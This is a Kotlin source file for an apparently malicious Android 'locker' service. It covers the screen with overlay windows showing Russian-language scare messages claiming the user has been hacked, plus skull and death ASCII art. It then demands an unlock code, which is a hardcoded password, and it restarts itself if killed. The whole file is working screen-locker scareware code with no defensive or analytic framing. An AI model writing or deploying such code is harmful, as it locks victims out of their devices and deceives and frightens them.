package com.clawd.locker

import android.app.Service
import android.content.Intent
import android.graphics.Color
import android.graphics.PixelFormat
import android.graphics.Typeface
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.text.InputType
import android.view.Gravity
import android.view.View
import android.view.WindowManager
import android.widget.Button
import android.widget.EditText
import android.widget.LinearLayout
import android.widget.TextView

class LockOverlayService : Service() {
    private lateinit var windowManager: WindowManager
    private lateinit var overlayView: LinearLayout
    private lateinit var mainText: TextView
    private lateinit var inputLayout: LinearLayout
    
    private val PASSWORD = "12908449519408372641"

    override fun onCreate() {
        super.onCreate()
        windowManager = getSystemService(WINDOW_SERVICE) as WindowManager
        
        val params = WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.MATCH_PARENT,
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY else WindowManager.LayoutParams.TYPE_PHONE,
            WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL or WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
            PixelFormat.TRANSLUCENT
        )
        
        overlayView = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            gravity = Gravity.CENTER
            setBackgroundColor(Color.parseColor("#800000")) // Темно-красный
        }
        
        mainText = TextView(this).apply {
            setTextColor(Color.WHITE)
            textSize = 16f
            typeface = Typeface.MONOSPACE
            gravity = Gravity.CENTER
            text = """
                _..---====---.._
                      _.-''     .----.     ''-._
                    .'         /      \         '.
                   <          |   ()   |          >
                    '.         \      /         .'
                      '-._      '----'      _.-'
                          ''--...____...--''
                             ВАС ЗАМЕТИЛИ
            """.trimIndent()
        }
        overlayView.addView(mainText)
        
        inputLayout = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            gravity = Gravity.CENTER
            visibility = View.GONE
            setPadding(20, 20, 20, 20)
            setBackgroundColor(Color.parseColor("#0000AA"))
        }
        
        val hintText = TextView(this).apply {
            text = "УВЫ! Вы подверглись масштабной хакерской атаке.\nВведите код разблокировки:"
            setTextColor(Color.WHITE)
            textSize = 16f
            gravity = Gravity.CENTER
        }
        
        val input = EditText(this).apply {
            hint = "Введите код"
            inputType = InputType.TYPE_CLASS_NUMBER
        }
        
        val btnUnlock = Button(this).apply {
            text = "РАЗБЛОКИРОВАТЬ"
            setOnClickListener {
                if (input.text.toString() == PASSWORD) {
                    stopSelf()
                } else {
                    input.error = "Неверный код!"
                }
            }
        }
        
        inputLayout.addView(hintText)
        inputLayout.addView(input)
        inputLayout.addView(btnUnlock)

        windowManager.addView(overlayView, params)
        windowManager.addView(inputLayout, params)

        startAnimation()
    }

    private fun startAnimation() {
        val handler = Handler(Looper.getMainLooper())
        
        handler.postDelayed({
            overlayView.setBackgroundColor(Color.parseColor("#B30000"))
            mainText.text = """
                 ...             
               ;::::;            
             ;::::; :;           
           ;:::::'   :;          
          ;:::::;     ;.         
         ,:::::'       ;           OOO\
         ::::::;       ;          OOOOO\
         ;:::::;       ;         OOOOOOOO
        ,;::::::;     ;'         / OOOOOOO
      ;:::::::::`. ,,,;.        /  / DOOOOOO
    .';:::::::::::::::::;,     /  /     DOOOO
   ,::::::;::::::;;;;::::;,   /  /        DOOO
  ;`::::::`'::::::;;;::::: ,#/  /          DOOO
  :`:::::::`;::::::;;::: ;::#  /            DOOO
  ::`:::::::`;:::::::: ;::::# /              DOO
  `:`:::::::`;:::::: ;::::::#/               DOO
   :::`:::::::`;; ;:::::::::##                OO
   ::::`:::::::`;::::::::;:::#                OO
   `:::::`::::::::::::;'`:;::#                O
    `:::::`::::::::;' /  / `:#
     ::::::`:::::;'  /  /   `#
            """.trimIndent()
            mainText.textSize = 9f // Уменьшили, чтобы смерть влезла в экран
            
            handler.postDelayed({
                overlayView.visibility = View.GONE
                inputLayout.visibility = View.VISIBLE
            }, 5000)
            
        }, 5000)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int = START_STICKY
    override fun onBind(intent: Intent?): IBinder? = null
    
    override fun onDestroy() {
        super.onDestroy()
        if (::overlayView.isInitialized) windowManager.removeView(overlayView)
        if (::inputLayout.isInitialized) windowManager.removeView(inputLayout)
    }
} 
